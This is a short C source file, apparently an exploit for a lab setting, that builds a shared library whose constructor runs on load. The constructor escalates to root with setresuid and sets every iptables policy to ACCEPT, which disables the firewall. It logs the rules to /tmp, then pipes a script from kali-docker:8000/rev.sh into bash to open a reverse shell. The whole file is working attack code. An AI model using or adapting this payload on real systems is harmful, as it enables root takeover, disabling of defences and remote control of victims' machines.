// gcc -o lib.so -shared expl.c -fPIC
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
  setresuid(0,0,0);
  system("iptables --policy INPUT ACCEPT > /tmp/out.txt");
  system("iptables --policy OUTPUT ACCEPT >> /tmp/out.txt");
  system("iptables --policy FORWARD ACCEPT >> /tmp/out.txt");
  system("sbin/iptables-save >> /tmp/out.txt");
  system("iptables -L >> /tmp/out.txt");
  system("curl kali-docker:8000/rev.sh | bash");
  system("id >> /tmp/out.txt");
}
